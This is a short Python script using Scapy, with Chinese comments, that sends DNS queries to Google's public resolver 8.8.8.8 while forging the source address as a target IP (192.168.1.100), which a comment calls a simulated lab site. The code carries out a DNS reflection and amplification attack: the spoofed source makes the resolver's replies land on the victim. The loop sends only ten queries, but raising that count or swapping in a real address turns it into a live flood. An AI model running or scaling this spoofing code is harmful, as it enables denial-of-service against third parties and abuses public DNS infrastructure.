from scapy.all import *

# Google DNS 伺服器的 IP 地址
dns_server = "8.8.8.8"

# 目標伺服器 IP（模擬實驗室網站）
target_ip = "192.168.1.100"

# 放大的 DNS 請求數量
num_requests = 10

# 要查詢的域名（使用大記錄以模擬放大效果）
domain_to_amplify = "example.com"

# 構建並發送 DNS 請求
for i in range(num_requests):
    dns_request = IP(dst=dns_server, src=target_ip) / UDP(dport=53, sport=RandShort()) / DNS(rd=1, qd=DNSQR(qname=domain_to_amplify))
    send(dns_request)
    print(f"發送第 {i+1} 個 DNS 請求到 {dns_server}，源地址偽造為 {target_ip}")
